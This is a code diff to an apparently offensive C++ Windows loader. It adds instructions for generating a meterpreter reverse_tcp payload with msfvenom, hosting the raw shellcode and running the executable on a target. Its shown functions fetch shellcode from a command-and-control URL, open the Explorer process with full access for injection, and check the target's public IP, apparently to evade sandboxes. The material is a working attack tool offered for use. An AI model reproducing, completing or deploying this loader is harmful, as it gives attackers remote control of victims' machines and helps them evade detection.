@@ -11,6 +11,14 @@
 #pragma comment(lib, "netapi32.lib")
 
 
+/* 1) GENERATE PAYLOAD WITH MSFVENOM:
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=YOURIP LPORT=YOURPORT -f raw -o index.raw
+
+COMPILE CODE
+HOST FILE index.raw from HOST MACHINE
+Run EXE on target
+*/
+
 using namespace std;
 
 int downloadAndExecute()
@@ -25,7 +33,7 @@ int downloadAndExecute()
     //Update the OpenProcess Windows API with your Explorer.exe Process ID. This can be found in Task Manager
     hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, 924);
     //Update the c2URL with your IP Address and the specific URI where your raw shellcode is stored.
-    const char* c2URL = "http://10.8.10.18/index.raw";
+    const char* c2URL = "http://HOSTIP/index.raw";
     IStream* stream;
     //Update the buff[] variable to include your shellcode size
     char buff[510];
@@ -79,7 +87,7 @@ BOOL memoryCheck() {
 
 BOOL checkIP()
 {
-    const char* websiteURL = "https://ifconfig.me/HOSTIP";
+    const char* websiteURL = "https://ifconfig.me/TARGET_IP";
     IStream* stream;
     string s;
     char buff[35];
@@ -92,7 +100,7 @@ BOOL checkIP()
         }
         s.append(buff, bytesRead);
     }
-    if (s == "VICTIM_IP") {
+    if (s == "TARGET_IP") {
         return TRUE;
     }
     else {
